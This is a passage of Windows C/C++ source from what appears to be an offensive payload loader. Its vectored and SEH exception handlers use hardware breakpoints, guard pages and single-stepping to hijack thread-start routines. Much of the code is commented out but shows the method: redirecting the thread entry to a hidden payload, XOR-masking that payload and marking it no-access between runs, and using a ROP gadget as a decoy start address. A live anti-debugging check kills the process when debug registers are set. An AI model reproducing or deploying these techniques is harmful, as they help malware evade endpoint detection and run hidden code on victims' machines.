        // printf("[+] syscall_addr_global: %p\n", syscall_addr_global);
        // e->ContextRecord->Dr0 = (DWORD64)syscall_addr_global;
        // e->ContextRecord->Dr1 = (DWORD64)syscall_ret_addr_global;
        // e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR0;
        // e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR1;
        
        //print CURRENT_EXCEPTION_INSTRUCTION_PTR:
        // printf("[+] CURRENT_EXCEPTION_INSTRUCTION_PTR: %p\n", CURRENT_EXCEPTION_INSTRUCTION_PTR);
        // if(CURRENT_EXCEPTION_INSTRUCTION_PTR != e->ContextRecord->Dr0) //Rip == Dr0-> ?
        // {   
        //     printf("[+] Rip != Dr0\n");
        //     e->ContextRecord->Dr0 = (DWORD64)syscall_addr_global;
        //     e->ContextRecord->Dr1 = (DWORD64)syscall_ret_addr_global;
        //     e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR0;
        //     e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR1;
        //     printf("[+] e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr0);
        //     printf("[+] e->ContextRecord->Dr1: %p\n", e->ContextRecord->Dr1);
        //     printf("[+] e->ContextRecord->Dr7: %p\n", e->ContextRecord->Dr7);


        //     e->ContextRecord->EFlags |= SINGLE_STEP_FLAG;
        //     return EXCEPTION_CONTINUE_SEARCH;
        // }        
        if(CURRENT_EXCEPTION_INSTRUCTION_PTR == e->ContextRecord->Dr0) {
			printf("[^_^] syscall breakpoint triggered at address: 0x%llx\n",
				   (DWORD64)e->ExceptionRecord->ExceptionAddress);


            printf("[*_*] This is vectored exception handler!!!\n");
			// replace the fake parameters with the real ones
            // Case 1: NtCreateThreadEx Set:
            // change R10 to a benign code location...., it is for the fifth arg for NtCreateThreadEx

            /// print the value of Rcx Rdx, R8, R9, R10 to check if they are correct:
            // printf("[+] Rcx: %p\n", e->ContextRecord->Rcx);
            // printf("[+] Rdx: %p\n", e->ContextRecord->Rdx);
            // printf("[+] R8: %p\n", e->ContextRecord->R8);
            // printf("[+] R9: %p\n", e->ContextRecord->R9);
            // printf("[+] R10: %p\n", e->ContextRecord->R10);
            // //print rax:
            // printf("[+] Rax: %p\n", e->ContextRecord->Rax);


            // //Change rcx for RtlUserThreadStart, Rcx stores the value of Thread Start Address that will be passed on to Rdx later. 
            // globalPointer = (PVOID)0X88888;
			// e->ContextRecord->Rcx = (DWORD64)globalPointer; // 1st arg
            // printf("[+] Rcx changed to globalPointer: %p\n", e->ContextRecord->Rcx);
			// // e->ContextRecord->Rax = (DWORD64)dllEntryPoint1; // change Rax to real start Addr, PVOID lpStartAddress
            // // set for Rsp + 0x28:

            // // context.Rsp points to the top of the stack
            // // DWORD64 *fifthArgAddr = (DWORD64 *)(e->ContextRecord->Rsp + 0x28); 
            // // printf("[+] Rsp + 0x28 before change: %p\n", *fifthArgAddr);
            // // *fifthArgAddr = (DWORD64)dllEntryPoint1; // Set your value
            // // // print the value of 0x28 after the Rsp:
            // // printf("[+] Rsp + 0x28 after change: %p\n", *fifthArgAddr);

            // // print the value of dllEntryPoint1 to check if it is correct:
            // printf("[+] dllEntryPoint1: %p\n", dllEntryPoint1);
            // printf("[+] compare it with the rcx of RtlUserThreadStart after change \n");
            // printf("[+] magic code length: %lu\n", dll_len);
            // //Call virtual protect with debug:
            
            // // e->ContextRecord->R10 = (DWORD64)dllEntryPoint1; // change Rax to real start Addr, PVOID lpStartAddress


            // // Change the thread entry to other address. 
            // //XOR the magic code, change to page_noaccess
            

            // //print tyhe key value:
            // printf("[+] XOR key: ");
            // for (int i = 0; i < 16; i++) {
            //     printf("%02x", key[i]);
            // }
            // printf("\n"); 
            // // encrypt the payload
            // DWORD oldPal = 0;
            // VirtualProtect(dllEntryPoint1, dll_len, PAGE_READWRITE, &oldPal);
            // sUrprise((char *) dllEntryPoint1, dll_len, key, sizeof(key));
            // printf("[+] Global dllEntryPoint1 memory encoded with XOR \n");
            // printf("[+] press any key to continue\n");
            // getchar();
            

            // // set the memory inaccessible
            // VirtualProtect(dllEntryPoint1, dll_len, PAGE_NOACCESS, &oldPal);
            // printf("[+] Global dllEntryPoint1 memory set to PAGE_NOACCESS (%#x)\n", GetLastError());

            // e->ContextRecord->Dr0 = (DWORD64)syscall_addr_global;
            // e->ContextRecord->Dr1 = (DWORD64)syscall_ret_addr_global;
            // e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR0;
            // e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR1;
            // printf("[+] After change: e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr0);
            // printf("[+] After change: e->ContextRecord->Dr1: %p\n", e->ContextRecord->Dr1);
            // printf("[+] After change: e->ContextRecord->Dr7: %p\n", e->ContextRecord->Dr7);
            // // //change the memory protection to PAGE_NOACCESS with NtProtectVirtualMemory:
            // [!] NtProtectVirtualMemory is DIFFERENT from VirtualProtect, can not be mixed with VirtualProtect
            // either use VirtualProtect or this function, not both.
            // NTSTATUS status = NtProtectVirtualMemory(
            // GetCurrentProcess(),
            // &dllEntryPoint1, // NtProtectVirtualMemory expects a pointer to the base address
            // &dll_len, // A pointer to the size of the region
            // PAGE_NOACCESS, // The new protection attributes, PAGE_NOACCESS
            // // PAGE_EXECUTE_WRITECOPY, 
            // &oldPal); // The old protection attributes
            // if(status != STATUS_SUCCESS) {
            //     printf("[-] NtProtectVirtualMemory failed to restore original memory protection. Status: %x\n", status);
            // } else {
            //     printf("[+] Memory protection before change was: %s\n", ProtectionToString(oldPal));
            //     printf("[+] Global dllEntryPoint1 memory set to PAGE_NOACCESS (%#x)\n", GetLastError());
            // }
            printf("[+] press any key to continue\n");
            getchar();
            // e->ContextRecord->EFlags |= (1 << 8);    // Trap Flag

		}
   
		// this exception was caused by DR1 (syscall ret breakpoint)
		// if (e->ContextRecord->Dr6 & 0x2) {
        else if (CURRENT_EXCEPTION_INSTRUCTION_PTR == e->ContextRecord->Dr1) {
			printf("[^_^] syscall ret breakpoint triggered at address: 0x%llx\n",
				   (DWORD64)e->ExceptionRecord->ExceptionAddress);
            printf("[*_*] This is vectored exception handler!!!\n");

            // // use VirtualProcect to restore memory page to RX,
            // // XOR magic code
            // //Call NtResumeThread at magicCode address
            // printf("[+] Restoring payload memory access and decrypting\n");
            // DWORD oldPal = 0;
            // // Change the memory back to XR for execution...
            // VirtualProtect(dllEntryPoint1, dll_len, PAGE_READWRITE, &oldPal);
            // sUrprise((char *) dllEntryPoint1, dll_len, key, sizeof(key));

            
            // VirtualProtect(dllEntryPoint1, dll_len, PAGE_EXECUTE_READ, &oldPal);
            // printf("[+] Global dllEntryPoint1 memory set to PAGE_EXECUTE_READ (%#x)\n", GetLastError());


            // printf("[+] Rcx: %p\n", e->ContextRecord->Rcx);
            // printf("[+] Rdx before change: %p\n", e->ContextRecord->Rdx);
            // printf("[+] R8: %p\n", e->ContextRecord->R8);
            // printf("[+] R9: %p\n", e->ContextRecord->R9);
            // printf("[+] R10: %p\n", e->ContextRecord->R10);
            // printf("[+] Rax: %p\n", e->ContextRecord->Rax); 
            // printf("The registers are cleared, there is no need to set them back to original values. \n");



            // context.Rsp points to the top of the stack TOGO: 
            // DWORD64 *fifthArgAddr = (DWORD64 *)(e->ContextRecord->Rsp + 0x28); 
            // printf("[+] Rsp + 0x28 before change: %p\n", *fifthArgAddr);
            // *fifthArgAddr = (DWORD64)globalPointer; // Set your value
            // // // print the value of 0x28 after the Rsp:k
            // printf("[+] Rsp + 0x28 after change: %p\n", *fifthArgAddr);

            //Change rdx for NaseTjreadInitThunk, Rdx stores the value of Thread Start Address that will be passed on to Rcx later.:
			// e->ContextRecord->Rdx = (DWORD64)dllEntryPoint1; // 1st arg
            // printf("[+] Rdx changed to: %p\n", e->ContextRecord->Rdx);
            // // globalPointer = (PVOID)0X88888;
            // // e->ContextRecord->Rdx = (DWORD64)globalPointer; // 1st arg

            // searchForROPGadget();
            // e->ContextRecord->Rdx = (DWORD64)foundRemoteAddress; // The start address
            // // e->ContextRecord->Rip = (DWORD64)foundRemoteAddress; // This works but will change the calling sequences. 
            // // e->ContextRecord->Rax = (DWORD64)dllEntryPoint1;
            // e->ContextRecord->R11 = (DWORD64)dllEntryPoint1; //It is safe to use caller saved register R11 for the real start address.
            
            // // e->ContextRecord->Dr0 = (DWORD64)syscall_addr_global;
            // e->ContextRecord->Dr1 = (DWORD64)0;
            // // e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR0;
            // e->ContextRecord->Dr7 &= DEBUG_REGISTER_EXEC_DR1; // clear the local bit
            // printf("[+] After change: e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr0);
            // printf("[+] After change: e->ContextRecord->Dr1: %p\n", e->ContextRecord->Dr1);
            // printf("[+] After change: e->ContextRecord->Dr7: %p\n", e->ContextRecord->Dr7);
			// e->ContextRecord->Rax = (DWORD64)dllEntryPoint1; // change Rax to real start Addr, PVOID lpStartAddress

            // Code can be executed with Rip as well....
			// e->ContextRecord->Rip = (DWORD64)dllEntryPoint1; // change 5th to real start Addr, PVOID lpStartAddress

            // NTSTATUS status = NtProtectVirtualMemory(
            // GetCurrentProcess(),
            // &dllEntryPoint1, // NtProtectVirtualMemory expects a pointer to the base address
            // &dll_len, // A pointer to the size of the region
            // PAGE_EXECUTE_READ, // The new protection attributes, PAGE_EXECUTE_READ
            // // PAGE_EXECUTE_WRITECOPY, 
            // &oldPal); // The old protection attributes
            // if(status != STATUS_SUCCESS) {
            //     printf("[-] NtProtectVirtualMemory failed to restore original memory protection. Status: %x\n", status);
            // } else {
            //     printf("[+] Memory protection before change was: %s\n", ProtectionToString(oldPal));
            //     printf("[+] Global dllEntryPoint1 memory set to PAGE_EXECUTE_READ (%#x)\n", GetLastError());
            // }
            // getchar();

            // If you want to play with it, but it is not useful for BaseThreadInitThunk
            // e->ContextRecord->Rax = 0xC0000156; // STATUS too many secrets.


		} 
        else {
            e->ContextRecord->Dr0 = (DWORD64)syscall_addr_global;
            e->ContextRecord->Dr1 = (DWORD64)syscall_ret_addr_global;
            e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR0;
            e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR1;
            printf("[-_-] Wrong place for breakpoint triggered at address: %p\n", e->ExceptionRecord->ExceptionAddress);
            // printf("[+] After change: e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr0);
            // printf("[+] After change: e->ContextRecord->Dr1: %p\n", e->ContextRecord->Dr1);
            // printf("[+] After change: e->ContextRecord->Dr7: %p\n", e->ContextRecord->Dr7);
            e->ContextRecord->EFlags |= (1 << 8); 
            return EXCEPTION_CONTINUE_EXECUTION;
        }
        
        return EXCEPTION_CONTINUE_EXECUTION;
	}

	e->ContextRecord->EFlags |= (1 << 16);  // set the ResumeFlag (FR) in EFlags register to continue execution, otherwise we have a loop.
	//e->ContextRecord->Rip++;						//use instruction pointer to skip the loop
    
	
    return EXCEPTION_CONTINUE_SEARCH;
    // return EXCEPTION_CONTINUE_EXECUTION;
}


// exception handler for hardware breakpoints
LONG WINAPI BreakpointHandlerSeh(PEXCEPTION_POINTERS e)
{
    // printf("[+] !!!!!!!!!!!!! Hard BreakpointHandler\n");
    // // print the e->ExceptionRecord->ExceptionCode
    // printf("[+] Exception code: %x\n", e->ExceptionRecord->ExceptionCode);

    // if status is page guard violation: 
    if(e->ExceptionRecord->ExceptionCode == STATUS_GUARD_PAGE_VIOLATION) {


        printf("[!!!!] Page guard Access violation at address: %p\n", e->ExceptionRecord->ExceptionAddress);
        printf("[+] Inside SEH, do nothing and pass control to VCH.\n");

        // a small trick to add a cherry on the top: 
        if ( e->ContextRecord->Dr0 || e->ContextRecord->Dr1 || e->ContextRecord->Dr2 || e->ContextRecord->Dr3 || e->ContextRecord->Dr6 || e->ContextRecord->Dr7) {
            e->ContextRecord = 0; // clear the context record
            // exit the program: 
            ExitProcess(0);
        } else {

            printf("[+] Inside PG, no debugger present. We may continue. \n");
        }
        // NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)dynamic::NotGetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
        // get NtCreateThreadEx address from ntdll
        
        // //Print Rdx value:
        // printf("[+] Rdx value: %p\n", e->ContextRecord->Rdx);
        
        // LPVOID NtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
		// if (e->ContextRecord->Rip == (DWORD64) SetCreateThread) {
        // if (1 == 1) {
		// 	printf("[!] Exception (%#llx)! Params:\n", e->ExceptionRecord->ExceptionAddress);
		// 	printf("(1): %#llx | ", e->ContextRecord->Rcx);
		// 	printf("(2): %#llx | ", e->ContextRecord->Rdx);
		// 	printf("(3): %#llx | ", e->ContextRecord->R8);
		// 	printf("(4): %#llx | ", e->ContextRecord->R9);
		// 	printf("RSP = %#llx\n", e->ContextRecord->Rsp);
        //     //print the 5th argument:
        //     DWORD64 *fifthArgAddr = (DWORD64 *)(e->ContextRecord->Rsp + 0x28); 
        //     printf("[+] Rsp + 0x28 before change: %p\n", *fifthArgAddr);
        //     // *fifthArgAddr = (DWORD64)dllEntryPoint1; // Set your value
        //     // // print the value of 0x28 after the Rsp:
        //     // printf("[+] Rsp + 0x28 after change: %p\n", *fifthArgAddr);
		// 	// getchar();
		// 	//e->ContextRecord->Rip = (DWORD64) &prn;
        //     bool bRtlUserThreadStart = TRUE;


        //     CONTEXT thread_context = { 0 };
        //     pRtlUserThreadStart = (RtlUserThreadStart_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlUserThreadStart");
        //     // check if pRtlUserThreadStart is a valid address: 
        //     if (!pRtlUserThreadStart) {
        //         printf("[-] Failed to locate RtlUserThreadStart.\n");
        //         return FALSE;
        //     } else {
        //         printf("[+] Located RtlUserThreadStart.\n");
        //     }
        //     if (!FindSyscallInstruction((LPVOID)pRtlUserThreadStart, &syscall_addr_global, &syscall_ret_addr_global, TRUE, FALSE)) {
        //         return FALSE;
        //     }
        //     //print syscall_addr_global
        //     // printf("[+] syscall_addr_global should be equal to Found mov r8, rdx: %p\n", syscall_addr_global);
        //     //print syscall_ret_addr
        //     // if syscall is RtlUserThreadStart, we need to break on the instruction after the syscall of NtCreateThreadEx
        //     if (bRtlUserThreadStart) {
        //         LPVOID syscall_addr_temp;

        //         pBaseThreadInitThunk = (BaseThreadInitThunk_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "BaseThreadInitThunk");

        //         if(!FindSyscallInstruction((PVOID)pBaseThreadInitThunk, &syscall_addr_temp, &syscall_ret_addr_global, FALSE, TRUE)) {
        //             return FALSE;
        //         } else {
        //             printf("[+] Syscall ret instruction for BaseThreadInitThunk at 0x%llx\n", (DWORD64)syscall_ret_addr_global);
        //         }

        //     }
        //     // print syscall_ret_addr
        //     printf("[+] syscall_ret_addr should be equal to previous one!!!: %p\n", syscall_ret_addr_global);

        //     //get thread context from exception pointer
        //     // thread_context = *e->ContextRecord;

        //     // dr7_t dr7 = { 0 };

        //     // /// dr0 - dr3 to set breakpoint as debug address registers. 
        //     // dr7.dr0_local = 1; // set DR0 as an execute breakpoint
        //     // dr7.dr1_local = 1; // set DR1 as an execute breakpoint

        //     // // thread_context.ContextFlags = CONTEXT_ALL;
        //     // e->ContextRecord->ContextFlags = CONTEXT_ALL;
        //     // // print e->ContextRecord->Dr0:
        //     // printf("[+] e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr0);
        //     // printf("[+] e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr1);
        //     // // print syscall_addr abd syscall_addr:
        //     // // printf("[+] syscall_addr: %p\n", syscall_addr);
        //     // // printf("[+] syscall_ret_addr: %p\n", syscall_ret_addr);

        //     // // thread_context.Dr0 = (DWORD64)syscall_addr;     // set DR0 to break on syscall address
        //     // e->ContextRecord->Dr0 = (DWORD64)syscall_addr;
        //     // // thread_context.Dr1 = (DWORD64)syscall_ret_addr; // set DR1 to break on syscall ret address
        //     // e->ContextRecord->Dr1 = (DWORD64)syscall_ret_addr;
        //     // // thread_context.Dr7 = *(DWORD*)&dr7;
        //     // e->ContextRecord->Dr7 = *(DWORD*)&dr7;

        //     // // CONTEXT context = *(ExceptionInfo->ContextRecord);
        //     // CONTEXT* context = e->ContextRecord;
        //     // // Define and initialize the DR7 structure
        //     // dr7_t dr7 = { 0 };

        //     // // Enable local breakpoints for DR0 and DR1
        //     // dr7.dr0_local = 1;
        //     // dr7.dr1_local = 1;
        //     // // Set the address for the breakpoints in DR0 and DR1
        //     // // Set the address for the breakpoints in DR0 and DR1
        //     // context->Dr0 = (DWORD64)syscall_addr;
        //     // context->Dr1 = (DWORD64)syscall_ret_addr;
        //     // // Copy the DR7 structure into the context's Dr7 register
        //     // context->Dr7 = *reinterpret_cast<DWORD64*>(&dr7);
        //     // // Ensure ContextFlags is set properly
        //     // context->ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS;
        //     // // context->EFlags |= (1 << 16); // Resume flag
        //     // // Print the changes for verification
        //     // SetUnhandledExceptionFilter(BreakpointHandler);
        //     // suspended the thread:
        //     // define it  type :
		// 	// dwReturnAddress = *(NATIVE_VALUE *)CURRENT_EXCEPTION_STACK_PTR;
		// 	e->ContextRecord->Dr0 = (DWORD64)syscall_addr_global;
        //     e->ContextRecord->Dr1 = (DWORD64)syscall_ret_addr_global;
		// 	e->ContextRecord->Dr7 |= DEBUG_REGISTER_EXEC_DR0;
        //     e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR1;
        //     printf("[+] After change: e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr0);
        //     printf("[+] After change: e->ContextRecord->Dr1: %p\n", e->ContextRecord->Dr1);
        //     printf("[+] After change: e->ContextRecord->Dr7: %p\n", e->ContextRecord->Dr7);

        //     // NtSuspendThread(g_thread_handle, NULL);
        //     // SetThreadContext(g_thread_handle, context);
        //     // resume thread: 
        //     // NtResumeThread(g_thread_handle, NULL);
        //     // e->ContextRecord->Rip = (DWORD64) syscall_addr;
        //     // MyRtlAddVectoredContinueHandler(1, &BreakpointHandler);


            
        // }
        
        // return EXCEPTION_CONTINUE_EXECUTION;
        // e->ContextRecord->EFlags |= (1 << 8);	// Trap Flag
        
        // e->ContextRecord->EFlags |= (1 << 16);
        
        DWORD threadId = GetCurrentThreadId();
        // printf("[+] Current Thread ID: %p\n", threadId);
        //print g_thread_handle
        // printf("[+] g_thread_handle: %p\n", GetThreadId(g_thread_handle));
        //print g_thread_handle2:
        DWORD g_thread_handle2Id = GetThreadId(g_thread_handle2);
        // printf("[+] g_thread_handle2: %p\n", g_thread_handle2Id);


        if(threadId == g_thread_handle2Id) {
            e->ContextRecord->EFlags |= SINGLE_STEP_FLAG; //single step after this exception
            return EXCEPTION_CONTINUE_EXECUTION;    
        } else {

            DWORD old;
            // VirtualProtect(reinterpret_cast<LPVOID>(WaitForSingleObject), 1, PAGE_EXECUTE_READ | PAGE_GUARD, &old);
            if(VirtualProtect(reinterpret_cast<LPVOID>(pRtlUserThreadStart), 1, PAGE_EXECUTE_READ | PAGE_GUARD, &old)) {
                printf("[+] Wrong thread, PAGE_GUARD set before pRtlUserThreadStart API. \n");
            } else {
                printf("[-] Failed to set PAGE_GUARD\n");
            }
            e->ContextRecord->EFlags |= (1 << 16);  // set the ResumeFlag (FR) in EFlags register to continue execution, otherwise we have a loop.
            return EXCEPTION_CONTINUE_EXECUTION;
        }


    } 
    
    
    // else if (e->ExceptionRecord->ExceptionCode == STATUS_ACCESS_VIOLATION) {
    //     printf("[+] Access violation at address: %p\n", e->ExceptionRecord->ExceptionAddress);
    //     return EXCEPTION_CONTINUE_SEARCH;
    // } 
    
    else if (e->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {

	    // // hardware breakpoints trigger a single step exception
        // printf("[+] Single step exception at address: %p\n", e->ExceptionRecord->ExceptionAddress);
        // printf("[+] e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr0);
        // printf("[+] e->ContextRecord->Dr1: %p\n", e->ContextRecord->Dr1);
        // printf("[+] e->ContextRecord->Dr7: %p\n", e->ContextRecord->Dr7);
        // //printf syscall_addr:
        // printf("[+] syscall_addr_global: %p\n", syscall_addr_global);
        // e->ContextRecord->Dr0 = (DWORD64)syscall_addr_global;
        // e->ContextRecord->Dr1 = (DWORD64)syscall_ret_addr_global;
        // e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR0;
        // e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR1;
        
        //print CURRENT_EXCEPTION_INSTRUCTION_PTR:
        // printf("[+] CURRENT_EXCEPTION_INSTRUCTION_PTR: %p\n", CURRENT_EXCEPTION_INSTRUCTION_PTR);
        // if(CURRENT_EXCEPTION_INSTRUCTION_PTR != e->ContextRecord->Dr0) //Rip == Dr0-> ?
        // {   
        //     printf("[+] Rip != Dr0\n");
        //     e->ContextRecord->Dr0 = (DWORD64)syscall_addr_global;
        //     e->ContextRecord->Dr1 = (DWORD64)syscall_ret_addr_global;
        //     e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR0;
        //     e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR1;
        //     printf("[+] e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr0);
        //     printf("[+] e->ContextRecord->Dr1: %p\n", e->ContextRecord->Dr1);
        //     printf("[+] e->ContextRecord->Dr7: %p\n", e->ContextRecord->Dr7);


        //     e->ContextRecord->EFlags |= SINGLE_STEP_FLAG;
        //     return EXCEPTION_CONTINUE_SEARCH;
        // }        
        if(CURRENT_EXCEPTION_INSTRUCTION_PTR == e->ContextRecord->Dr0) {
			printf("[^_^] syscall breakpoint triggered at address: 0x%llx\n",
				   (DWORD64)e->ExceptionRecord->ExceptionAddress);


            printf("[*_*] This is SEH!!!\n");
			// replace the fake parameters with the real ones
            // Case 1: NtCreateThreadEx Set:
            // change R10 to a benign code location...., it is for the fifth arg for NtCreateThreadEx

            /// print the value of Rcx Rdx, R8, R9, R10 to check if they are correct:
            // printf("[+] Rcx: %p\n", e->ContextRecord->Rcx);
            // printf("[+] Rdx: %p\n", e->ContextRecord->Rdx);
            // printf("[+] R8: %p\n", e->ContextRecord->R8);
            // printf("[+] R9: %p\n", e->ContextRecord->R9);
            // printf("[+] R10: %p\n", e->ContextRecord->R10);
            // //print rax:
            // printf("[+] Rax: %p\n", e->ContextRecord->Rax);


            // //Change rcx for RtlUserThreadStart, Rcx stores the value of Thread Start Address that will be passed on to Rdx later. 
            // globalPointer = (PVOID)0X88888;
			// e->ContextRecord->Rcx = (DWORD64)globalPointer; // 1st arg
            // printf("[+] Rcx changed to globalPointer: %p\n", e->ContextRecord->Rcx);
			// // e->ContextRecord->Rax = (DWORD64)dllEntryPoint1; // change Rax to real start Addr, PVOID lpStartAddress
            // // set for Rsp + 0x28:

            // // context.Rsp points to the top of the stack
            // // DWORD64 *fifthArgAddr = (DWORD64 *)(e->ContextRecord->Rsp + 0x28); 
            // // printf("[+] Rsp + 0x28 before change: %p\n", *fifthArgAddr);
            // // *fifthArgAddr = (DWORD64)dllEntryPoint1; // Set your value
            // // // print the value of 0x28 after the Rsp:
            // // printf("[+] Rsp + 0x28 after change: %p\n", *fifthArgAddr);

            // // print the value of dllEntryPoint1 to check if it is correct:
            // printf("[+] dllEntryPoint1: %p\n", dllEntryPoint1);
            // printf("[+] compare it with the rcx of RtlUserThreadStart after change \n");
            // printf("[+] magic code length: %lu\n", dll_len);
            // //Call virtual protect with debug:
            
            // // e->ContextRecord->R10 = (DWORD64)dllEntryPoint1; // change Rax to real start Addr, PVOID lpStartAddress


            // // Change the thread entry to other address. 
            // //XOR the magic code, change to page_noaccess
            

            // //print tyhe key value:
            // printf("[+] XOR key: ");
            // for (int i = 0; i < 16; i++) {
            //     printf("%02x", key[i]);
            // }
            // printf("\n"); 
            // // encrypt the payload
            // DWORD oldPal = 0;
            // VirtualProtect(dllEntryPoint1, dll_len, PAGE_READWRITE, &oldPal);
            // sUrprise((char *) dllEntryPoint1, dll_len, key, sizeof(key));
            // printf("[+] Global dllEntryPoint1 memory encoded with XOR \n");
            // printf("[+] press any key to continue\n");
            // getchar();
            

            // // set the memory inaccessible
            // VirtualProtect(dllEntryPoint1, dll_len, PAGE_NOACCESS, &oldPal);
            // printf("[+] Global dllEntryPoint1 memory set to PAGE_NOACCESS (%#x)\n", GetLastError());

            // e->ContextRecord->Dr0 = (DWORD64)syscall_addr_global;
            // e->ContextRecord->Dr1 = (DWORD64)syscall_ret_addr_global;
            // e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR0;
            // e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR1;
            // printf("[+] After change: e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr0);
            // printf("[+] After change: e->ContextRecord->Dr1: %p\n", e->ContextRecord->Dr1);
            // printf("[+] After change: e->ContextRecord->Dr7: %p\n", e->ContextRecord->Dr7);
            // // //change the memory protection to PAGE_NOACCESS with NtProtectVirtualMemory:
            // [!] NtProtectVirtualMemory is DIFFERENT from VirtualProtect, can not be mixed with VirtualProtect
            // either use VirtualProtect or this function, not both.
            // NTSTATUS status = NtProtectVirtualMemory(
            // GetCurrentProcess(),
            // &dllEntryPoint1, // NtProtectVirtualMemory expects a pointer to the base address
            // &dll_len, // A pointer to the size of the region
            // PAGE_NOACCESS, // The new protection attributes, PAGE_NOACCESS
            // // PAGE_EXECUTE_WRITECOPY, 
            // &oldPal); // The old protection attributes
            // if(status != STATUS_SUCCESS) {
            //     printf("[-] NtProtectVirtualMemory failed to restore original memory protection. Status: %x\n", status);
            // } else {
            //     printf("[+] Memory protection before change was: %s\n", ProtectionToString(oldPal));
            //     printf("[+] Global dllEntryPoint1 memory set to PAGE_NOACCESS (%#x)\n", GetLastError());
            // }
            printf("[+] press any key to continue\n");
            getchar();
            // e->ContextRecord->EFlags |= (1 << 8);    // Trap Flag

		}
   
		// this exception was caused by DR1 (syscall ret breakpoint)
		// if (e->ContextRecord->Dr6 & 0x2) {
        else if (CURRENT_EXCEPTION_INSTRUCTION_PTR == e->ContextRecord->Dr1) {
			printf("[^_^] syscall ret breakpoint triggered at address: 0x%llx\n",
				   (DWORD64)e->ExceptionRecord->ExceptionAddress);
            printf("[*_*] This is SEH!!! Yo! \n");

            // // use VirtualProcect to restore memory page to RX,
            // // XOR magic code
            // //Call NtResumeThread at magicCode address
            // printf("[+] Restoring payload memory access and decrypting\n");
            // DWORD oldPal = 0;
            // // Change the memory back to XR for execution...
            // VirtualProtect(dllEntryPoint1, dll_len, PAGE_READWRITE, &oldPal);
            // sUrprise((char *) dllEntryPoint1, dll_len, key, sizeof(key));

            
            // VirtualProtect(dllEntryPoint1, dll_len, PAGE_EXECUTE_READ, &oldPal);
            // printf("[+] Global dllEntryPoint1 memory set to PAGE_EXECUTE_READ (%#x)\n", GetLastError());


            // printf("[+] Rcx: %p\n", e->ContextRecord->Rcx);
            // printf("[+] Rdx before change: %p\n", e->ContextRecord->Rdx);
            // printf("[+] R8: %p\n", e->ContextRecord->R8);
            // printf("[+] R9: %p\n", e->ContextRecord->R9);
            // printf("[+] R10: %p\n", e->ContextRecord->R10);
            // printf("[+] Rax: %p\n", e->ContextRecord->Rax); 
            // printf("The registers are cleared, there is no need to set them back to original values. \n");



            // context.Rsp points to the top of the stack TOGO: 
            // DWORD64 *fifthArgAddr = (DWORD64 *)(e->ContextRecord->Rsp + 0x28); 
            // printf("[+] Rsp + 0x28 before change: %p\n", *fifthArgAddr);
            // *fifthArgAddr = (DWORD64)globalPointer; // Set your value
            // // // print the value of 0x28 after the Rsp:k
            // printf("[+] Rsp + 0x28 after change: %p\n", *fifthArgAddr);

            //Change rdx for NaseTjreadInitThunk, Rdx stores the value of Thread Start Address that will be passed on to Rcx later.:
			// e->ContextRecord->Rdx = (DWORD64)dllEntryPoint1; // 1st arg
            // printf("[+] Rdx changed to: %p\n", e->ContextRecord->Rdx);
            // // globalPointer = (PVOID)0X88888;
            // // e->ContextRecord->Rdx = (DWORD64)globalPointer; // 1st arg

            // searchForROPGadget();
            // e->ContextRecord->Rdx = (DWORD64)foundRemoteAddress; // The start address
            // // e->ContextRecord->Rip = (DWORD64)foundRemoteAddress; // This works but will change the calling sequences. 
            // // e->ContextRecord->Rax = (DWORD64)dllEntryPoint1;
            // e->ContextRecord->R11 = (DWORD64)dllEntryPoint1; //It is safe to use caller saved register R11 for the real start address.
            
            // // e->ContextRecord->Dr0 = (DWORD64)syscall_addr_global;
            // e->ContextRecord->Dr1 = (DWORD64)0;
            // // e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR0;
            // e->ContextRecord->Dr7 &= DEBUG_REGISTER_EXEC_DR1; // clear the local bit
            // printf("[+] After change: e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr0);
            // printf("[+] After change: e->ContextRecord->Dr1: %p\n", e->ContextRecord->Dr1);
            // printf("[+] After change: e->ContextRecord->Dr7: %p\n", e->ContextRecord->Dr7);
			// e->ContextRecord->Rax = (DWORD64)dllEntryPoint1; // change Rax to real start Addr, PVOID lpStartAddress

            // Code can be executed with Rip as well....
			// e->ContextRecord->Rip = (DWORD64)dllEntryPoint1; // change 5th to real start Addr, PVOID lpStartAddress

            // NTSTATUS status = NtProtectVirtualMemory(
            // GetCurrentProcess(),
            // &dllEntryPoint1, // NtProtectVirtualMemory expects a pointer to the base address
            // &dll_len, // A pointer to the size of the region
            // PAGE_EXECUTE_READ, // The new protection attributes, PAGE_EXECUTE_READ
